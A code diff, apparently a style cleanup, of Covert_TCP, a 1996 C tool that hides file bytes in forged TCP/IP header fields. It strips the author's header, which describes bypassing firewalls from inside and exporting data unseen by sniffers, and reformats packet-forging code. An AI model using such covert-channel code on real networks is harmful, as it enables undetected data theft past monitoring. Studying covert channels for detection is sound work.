@@ -1,30 +1,3 @@
-/* Covert_TCP 1.0 - Covert channel file transfer for Linux
-* Written by Craig H. Rowland (crowland@psionic.com)
-* Copyright 1996 Craig H. Rowland (11-15-96)
-* NOT FOR COMMERCIAL USE WITHOUT PERMISSION.
-*
-*
-* This program manipulates the TCP/IP header to transfer a file one byte
-* at a time to a destination host. This progam can act as a server and a client
-* and can be used to conceal transmission of data inside the IP header.
-* This is useful for bypassing firewalls from the inside, and for
-* exporting data with innocuous looking packets that contain no data for
-* sniffers to analyze. In other words, spy stuff... :)
-*
-* PLEASE see the enclosed paper for more information!!
-*
-* This software should be used at your own risk.
-*
-* compile: cc -o covert_tcp covert_tcp.c
-*
-*
-*
-* Portions of this code based on ping.c (c) 1987 Regents of the
-* University of California. (See function in_cksm() for details)
-*
-* Small portions from various packet utilities by unknown authors
-*/
-
 #include "covert_tcp.h"
 
 int main(int argc, char **argv)
@@ -100,7 +73,8 @@ int main(int argc, char **argv)
     /* check the encoding flags */
     if(ipid+seq+ack == 0)
     {
-        ipid=1; /* set default encode type if none given */
+        /* set default encode type if none given */
+        ipid=1;
     }
     else if (ipid+seq+ack !=1)
     {
@@ -114,7 +88,8 @@ int main(int argc, char **argv)
         exit(1);
     }
 
-    if(server==0) /* if they want to be a client do this... */
+    /* if they want to be a client do this... */
+    if(server==0)
     {
         if (source_host == 0 && dest_host == 0)
         {
@@ -212,7 +187,7 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
         char buffer[10000];
     } recv_pkt;
 
-   /* From synhose.c by knight */
+    /* From synhose.c by knight */
     struct pseudo_header
     {
         unsigned int source_address;
@@ -269,9 +244,13 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
             /* if we are NOT doing IP ID header encoding, randomize the value */
             /* of the IP identification field */
             if (ipid == 0)
-            send_tcp.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0));
+            {
+                send_tcp.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0));
+            }
             else /* otherwise we "encode" it with our cheesy algorithm */
-            send_tcp.ip.id =ch;
+            {
+                send_tcp.ip.id =ch;
+            }
 
             send_tcp.ip.frag_off = 0;
             send_tcp.ip.ttl = 64;
@@ -282,14 +261,22 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 
             /* begin forged TCP header */
             if(source_port == 0) /* if the didn't supply a source port, we make one */
-            send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+            {
+                send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+            }
             else /* otherwise use the one given */
-            send_tcp.tcp.source = htons(source_port);
+            {
+                send_tcp.tcp.source = htons(source_port);
+            }
 
             if(seq==0) /* if we are not encoding the value into the seq number */
-            send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+            {
+                send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+            }
             else /* otherwise we'll hide the data using our cheesy algorithm one more time. */
-            send_tcp.tcp.seq = ch;
+            {
+                send_tcp.tcp.seq = ch;
+            }
 
             /* forge destination port */
             send_tcp.tcp.dest = htons(dest_port);
@@ -496,13 +483,15 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes)
     */
 
     sum = 0;
-    while (nbytes > 1)  {
+    while (nbytes > 1)
+    {
         sum += *ptr++;
         nbytes -= 2;
     }
 
     /* mop up an odd byte, if necessary */
-    if (nbytes == 1) {
+    if (nbytes == 1)
+    {
         oddbyte = 0;                                /* make sure top half is zero */
         *((u_char *) &oddbyte) = *(u_char *)ptr;    /* one byte only */
         sum += oddbyte;
@@ -512,7 +501,7 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes)
     * Add back carry outs from top 16 bits to low 16 bits.
     */
 
-sum  = (sum >> 16) + (sum & 0xffff);                /* add high-16 to low-16 */
+    sum  = (sum >> 16) + (sum & 0xffff);            /* add high-16 to low-16 */
     sum += (sum >> 16);                             /* add carry */
     answer = ~sum;                                  /* ones-complement, then truncate to 16 bits */
 
